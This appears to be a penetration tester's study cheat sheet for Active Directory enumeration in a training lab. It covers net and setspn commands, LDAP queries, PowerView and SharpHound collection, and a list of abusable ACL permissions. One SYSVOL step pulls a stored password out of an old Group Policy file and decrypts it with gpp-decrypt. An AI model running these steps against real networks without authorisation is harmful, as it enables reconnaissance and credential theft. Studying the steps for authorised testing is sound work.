# Enumeration
## Enumeration Using Legacy Windows Tools
- Get users in the domain
```
net user /domain
```
- Get specific user details in the domain
```
net user <username> /domain
```
- Get groups in the domain
```
net group /domain
```
- Get group details in the domain
```
net group "<group-name>" /domain
```
- We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all Service Principal Names in the domain. Since the information is registered and stored in AD, it is present on the domain controller. To obtain the data, we will again query the DC, this time searching for specific SPNs. (SECOND METHOD IS IN POWERVIEW)
```
setspn -L <domain-user-name>
```
## PowerShell and .NET Classes
PowerShell cmdlets like `Get-ADUser` work well but they are only installed by default on domain controllers as part of the Remote Server Administration Tools (RSAT).
- Getting the required hostname for the PDC - `PdcRoleOwner` (PS)
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
- Getting the DN
```
([adsi]'').distinguishedName
```
- Getting LDAP URL. Example: `LDAP://DC1.corp.com/DC=corp,DC=com`
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```
- Getting `DirectoryEntry`
```
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
```
- Getting `DirectorySearcher`
```
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```
- Enumerate all the users in DC
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```
## [PoverView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- Import the module
```
Import-Module .\PowerView.ps1
```
- Getting the DC information
```
Get-NetDomain
```
- Get User details
```
Get-NetUser
```
It is possible to filter it too:
```
Get-NetUser | select cn
```
```
Get-NetUser | select cn,pwdlastset,lastlogon
```
- Getting Group details
```
Get-NetGroup | select cn
```
- Getting group members
```
Get-NetGroup "Sales Department" | select member
```
- https://powersploit.readthedocs.io/en/latest/Recon/
- Get computer details
```
Get-NetComputer
```
- Scanning the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
```
Find-LocalAdminAccess
```
- Which user is logged in to which computer
```
Get-NetSession -ComputerName <computer-name> -Verbose
```
- Enumerating Service Principal Names 
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
### Enumerating Object Permissions
Juicy Permissions:
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
- Enumerate the user's ACE (Access Control Entry). The main points are `ObjectSID`, `ActiveDirectoryRights`, `SecurityIdentifier`.
```
Get-ObjectAcl -Identity <username>
```
- Conver SID to Name
```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```
- Check if any users have GenericAll permissions
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
### Enumerating Domain Shares
- Finding shares in the domain
```
Find-DomainShare
```
- Finding accessible shares in the domain for the current user
```
Find-DomainShare -CheckShareAccess
```
- SYSVOL share
```
ls \\dc1.corp.com\sysvol\corp.com\

# Finding old policy file
ls \\dc1.corp.com\sysvol\corp.com\Policies\

#Find password in it
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml

#Decrypt the password
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```
## PsLoggedOn
- To find logged on users on hosts
```
.\PsLoggedon.exe \\files04
```
---
## [SharpHound](https://github.com/BloodHoundAD/SharpHound)
Data Collector for BloodHound
- Import the script
```
Import-Module .\Sharphound.ps1
```
- we'll attempt to gather All data, which will perform all collection methods except for local group policies.
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
Now transfer `.zip` file to the Kali. `.bin` file is a cache file and it is not required. It is okay to delete it.
## [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- Start Neo4j db
```
sudo neo4j start
```
- Initialize Neo4j (neo4j:neo4j)
```
http://localhost:7474
```

